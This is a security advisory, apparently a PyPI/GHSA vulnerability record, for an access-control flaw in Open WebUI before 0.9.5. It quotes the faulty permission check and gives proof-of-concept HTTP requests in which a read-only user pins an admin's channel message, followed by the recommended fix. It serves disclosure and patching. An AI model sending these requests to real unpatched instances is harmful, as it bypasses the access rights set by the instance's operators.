@@ -1,0 +1,122 @@
+PYSEC-2026-2705 PyPI/open-webui — Open WebUI has an IDOR vulnerability in the pin_channel_message API endpoint
+package: open-webui
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.9.5 (ECOSYSTEM)
+aliases: CVE-2026-45386, GHSA-5gc6-xhv4-2wg6
+references:
+  https://github.com/open-webui/open-webui/security/advisories/GHSA-5gc6-xhv4-2wg6
+  https://nvd.nist.gov/vuln/detail/CVE-2026-45386
+  https://github.com/open-webui/open-webui
+  https://github.com/open-webui/open-webui/releases/tag/v0.9.5
+  https://pypi.org/project/open-webui
+  https://github.com/advisories/GHSA-5gc6-xhv4-2wg6
+
+### Summary
+`Pin/Unpin` is a write operation (modifies the message's `is_pinned `, `pinned_by`, `pinned_at` fields), but in standard channels it only checks `read` permission, allowing users with read-only access to pin/unpin any message.
+
+### Details
+https://github.com/open-webui/open-webui/blob/9bd84258d09eefe7bf975878fb0e31a5dadfe0f8/backend/open_webui/routers/channels.py#L1218
+
+```
+@router.post('/{id}/messages/{message_id}/pin', response_model=Optional[MessageUserResponse])
+async def pin_channel_message(
+    request: Request,
+    id: str,
+    message_id: str,
+    form_data: PinMessageForm,
+    user=Depends(get_verified_user),
+    db: Session = Depends(get_session),
+):
+    check_channels_access(request)
+    channel = Channels.get_channel_by_id(id, db=db)
+    if not channel:
+        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=ERROR_MESSAGES.NOT_FOUND)
+
+    if channel.type in ['group', 'dm']:
+        if not Channels.is_user_channel_member(channel.id, user.id, db=db):
+            raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail=ERROR_MESSAGES.DEFAULT())
+    else:
+        if user.role != 'admin' and not channel_has_access(user.id, channel, permission='read', db=db):
+            raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail=ERROR_MESSAGES.DEFAULT())
+```
+
+The `channel_has_access` function https://github.com/open-webui/open-webui/blob/9bd84258d09eefe7bf975878fb0e31a5dadfe0f8/backend/open_webui/routers/channels.py#L75 checks user permissions against the `AccessGrants` table:
+
+```
+def channel_has_access(
+    user_id: str,
+    channel: ChannelModel,
+    permission: str = 'read',  # 'read' or 'write'
+    strict: bool = True,
+    db: Optional[Session] = None,
+) -> bool:
+    if AccessGrants.has_access(
+        user_id=user_id,
+        resource_type='channel',
+        resource_id=channel.id,
+        permission=permission,
+        db=db,
+    ):
+        return True
+    # ...
+```
+
+The `AccessGrant` table distinguishes between `read` and `write` permission levels.
+
+### PoC
+`admin` creates Standard Channel with Read-Only Access for `test1` :
+
+```
+POST /api/v1/channels/create
+Authorization: 
+Content-Type: application/json
+
+{
+  "name": "pin-test-standard",
+  "access_grants": [
+    {
+      "principal_type": "user",
+      "principal_id": "cfc3cb19-9e92-4bf7-8b72-1b47fe4ff62c",
+      "permission": "read"
+    }
+  ]
+}
+```
+
+`admin` posts a Message in the Channel,  and  `test1` has `read` permission only.
+<img width="1024" height="423" alt="image" src="https://github.com/user-attachments/assets/e9912bd7-3908-44f2-8984-22d0535dc66f" />
+
+`test1` attempts to Pin Message:
+
+```
+POST /api/v1/channels/0699b656-578f-4976-94b0-65e2b19752fd/messages/4797359b-aad5-4081-9617-e8ca58524a87/pin
+Authorization: Bearer <test1_token>
+Content-Type: application/json
+
+{
+  "is_pinned": true
+}
+```
+
+```
+{
+  "id": "4797359b-aad5-4081-9617-e8ca58524a87",
+  "user_id": "28c859b7-84e2-4217-b4d7-3f0e43f7c4b9",
+  "is_pinned": true,
+  "pinned_by": "cfc3cb19-9e92-4bf7-8b72-1b47fe4ff62c",
+  "pinned_at": 1774716314908288719,
+  "content": "Admin announcement in standard channel - test1 should NOT be able to pin this"
+}
+```
+
+Successfully pinned admin's message. `pinned_by` records test1's user ID.
+<img width="1024" height="350" alt="image" src="https://github.com/user-attachments/assets/705b1f45-95a9-4e91-8a74-10bdbccde0b8" />
+
+ `test1` (Read-Only) can alse Unpin Message. The Pin/Unpin endpoint in standard channels only checks `read` permission, allowing read-only users to pin/unpin any message.
+
+### Impact
+Read-only users can pin irrelevant messages, disrupting important information display in the channel .
+
+### Recommended Fix
+Change the Pin endpoint's permission check from `read` to `write` .
